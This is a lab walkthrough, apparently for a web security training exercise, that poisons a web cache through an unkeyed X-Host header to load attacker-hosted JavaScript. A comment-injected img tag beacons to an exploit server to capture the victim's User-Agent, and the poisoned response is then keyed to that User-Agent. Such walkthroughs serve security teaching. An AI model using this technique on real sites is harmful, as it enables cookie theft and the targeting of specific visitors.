# Targeted web cache poisoning using an unkown header
* This lab is vulnerable to web cache poisoning. A user visits the home page roughly once a minute. The user also views any comments you post. To solve ths lab, you need to poison the cache with a response that executes `alert(document.cookie` in the visitor's browser. 
	* However, you also need to make sure that the response is served to the specific subset of users to which the indtended victim belongs.

### 1. Capture a request and use Param Miner to find some possible headers
* Capture a request from the home page and right click to use `Extensions => Param Miner =>Para Miner => Header poison`

![20](https://user-images.githubusercontent.com/53956303/155818146-78a7fb71-8889-41f3-a962-cb41b51deb64.png)
* From the result, an interesting header `X-Host` is found.

![21](https://user-images.githubusercontent.com/53956303/155818176-b69b7050-3b8d-49a8-81e3-fd9bf58f204d.png)
### 2. Add a cache-buster query parameter and _X-Host_ header to a request
* Use a value of `?cb=12345` as the cache-buster query parameter and `X-Host: test.com` as the header.
	* Then, send the request until `X-Cache: hit` is given on the response.

![22](https://user-images.githubusercontent.com/53956303/155818604-9924b95e-1d89-4318-b037-5ab4ebbcf187.png)
* The value of _X-Host_ is dynamically used to generate an absolute URL for importing the JavaScript file stored at `/resources/js/tracking.js`
### 3. Make an exploit on the provided exploit server
![23](https://user-images.githubusercontent.com/53956303/155818810-fbebb233-a18c-46f2-a2b5-cbe1375366bc.png)
### 4. Send the modified request
* Insert the exploit server ID as a value of _X-Host_ header, and send the request `X-Cache: Hit` is given on the response.

![24](https://user-images.githubusercontent.com/53956303/155819077-d99b4887-d43b-4c89-9fd9-7a1beaa5439a.png)
* From the response, a `Vary` header is used to specify that the `User-Agent` is part of the cache key.
	* To target the victim, a target's `User-Agent` must be found.

### 5. Obtaining the target's _User-Agent_
* Since the victim checks all the comments and the comment feature allows ceratin HTML tags, Inject a script to obtain the target's _User-Agent_.
```html
<img src="https://exploit-ace71f441ebb0d17c02b973d01a50080.web-security-academy.net/foo" />
```
* Then, obtaining the data from the "Access log" functionality.

![25](https://user-images.githubusercontent.com/53956303/155819479-873ce539-3979-42b3-9b46-c40c0ab616d5.png)
* From the result, the target's `User-Agent` is obtained.
### 6. Send request to target the user
* Remove the cache-buster query parameter and insert `User-Agent` information. Then, send the request until the response returns `X-Cache: hit`.

![26](https://user-images.githubusercontent.com/53956303/155819883-cf973da0-ca7c-4fce-8b1f-adb41d249f61.png)
* Keep send the request until the victim visits the site.
	* As a result, the lab is solved.

![27](https://user-images.githubusercontent.com/53956303/155820279-d9c9f907-96fe-47ed-89d7-0e4de24a1e2d.png)
